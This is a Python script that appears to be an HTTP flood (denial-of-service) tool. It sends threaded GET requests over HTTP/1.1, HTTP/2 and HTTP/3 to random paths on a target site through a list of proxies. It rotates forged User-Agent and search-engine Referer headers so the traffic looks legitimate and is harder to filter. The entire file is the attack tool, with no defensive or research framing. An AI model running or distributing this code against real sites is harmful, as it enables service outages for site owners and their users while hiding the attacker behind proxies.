import threading
import asyncio
import random
import socket
import ssl
import httpx
import time
import sys
from urllib.parse import urlparse
from aioquic.asyncio import connect
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import HandshakeCompleted
from aioquic.h3.connection import H3_ALPN, H3Connection

# Utility Functions
def get_random_int(min_val, max_val):
    return random.randint(min_val, max_val)

def random_element(elements):
    return random.choice(elements)

def generate_random_string(min_length, max_length):
    characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    length = get_random_int(min_length, max_length)
    return ''.join(random.choice(characters) for _ in range(length))

# Validasi input
if len(sys.argv) <= 4:
    print("Usage: python script.py <target_url> <time_limit> <proxy_file> <num_threads>\nExample: python script.py https://example.com 60 proxies.txt 20")
    sys.exit(-1)

target = sys.argv[1]
parsed_url = urlparse(target)
host = parsed_url.netloc
time_limit = int(sys.argv[2])
proxy_file = sys.argv[3]
num_threads = int(sys.argv[4])

# Set fixed rate limit
rate_limit = 0.2

UAs = [
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
	"Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0;  rv:11.0) like Gecko",
	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)",
	"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.648.127 Chrome/10.0.648.127 Safari/534.16",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.127 Safari/534.16",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.127 Safari/534.16",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.127 Safari/534.16",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
]

referers = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.yahoo.com/"
]

# Load proxies
with open(proxy_file, 'r') as f:
    proxies = [line.strip() for line in f.readlines() if ":" in line]

def get_random_proxy():
    return random.choice(proxies)

# Send HTTP/1.1 Requests
def send_http1_requests():
    try:
        proxy = get_random_proxy().split(":")
        if len(proxy) != 2:
            return
        with socket.create_connection((proxy[0], int(proxy[1]))) as s:
            s = ssl.wrap_socket(s)
            s.settimeout(5)
            for _ in range(2000):
                user_agent = random_element(UAs)
                referer = random_element(referers)
                random_path = generate_random_string(5, 10)
                request = (
                    f"GET {target}/{random_path} HTTP/1.1\r\n"
                    f"Host: {parsed_url.netloc}\r\n"
                    f"User-Agent: {user_agent}\r\n"
                    f"Referer: {referer}\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                s.sendall(request.encode())
                time.sleep(rate_limit)  # Apply rate limiting
    except Exception as e:
        print(f"Exception in HTTP/1.1 request: {e}")

# Send HTTP/2 Requests
def send_http2_requests():
    try:
        proxy = get_random_proxy()
        proxies = {"http://": f"http://{proxy}", "https://": f"http://{proxy}"}
        with httpx.Client(http2=True, proxies=proxies, verify=False) as client:
            for _ in range(2000):
                user_agent = random_element(UAs)
                referer = random_element(referers)
                random_path = generate_random_string(5, 10)
                headers = {
                    "User-Agent": user_agent,
                    "Referer": referer,
                    "Host": parsed_url.netloc,
                    "Connection": "keep-alive"
                }
                response = client.get(f"{target}/{random_path}", headers=headers)
                time.sleep(rate_limit)  # Apply rate limiting
    except Exception as e:
        print(f"Exception in HTTP/2 request: {e}")

# Send HTTP/3 Requests
async def send_http3_requests():
    try:
        proxy = get_random_proxy().split(":")
        if len(proxy) != 2:
            return
        quic_config = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
        async with connect(parsed_url.netloc, 443, configuration=quic_config, local_addr=(proxy[0], int(proxy[1]))) as protocol:
            quic_conn = protocol._quic
            h3_conn = H3Connection(quic_conn)
            random_path = generate_random_string(5, 10)
            quic_conn.send(h3_conn.send_headers(
                stream_id=0,
                headers=[
                    (b":method", b"GET"),
                    (b":scheme", b"https"),
                    (b":authority", parsed_url.netloc.encode()),
                    (b":path", f"/{random_path}".encode()),
                    (b"user-agent", random_element(UAs).encode()),
                    (b"referer", random_element(referers).encode())
                ],
            ))
            await asyncio.sleep(rate_limit)  # Apply rate limiting
            await protocol.wait_closed()
    except Exception as e:
        print(f"Exception in HTTP/3 request: {e}")

# Send Requests in Threads
def send_requests_threaded(send_function):
    threads = []
    for _ in range(num_threads):  # Fixed number of threads
        thread = threading.Thread(target=send_function)
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

async def main():
    start_time = time.time()
    while time.time() - start_time < time_limit:
        send_requests_threaded(send_http1_requests)
        send_requests_threaded(send_http2_requests)
        await send_http3_requests()
        await asyncio.sleep(random.uniform(rate_limit, rate_limit + 0.1))  # Randomize sleep time slightly

if __name__ == "__main__":
    asyncio.run(main())
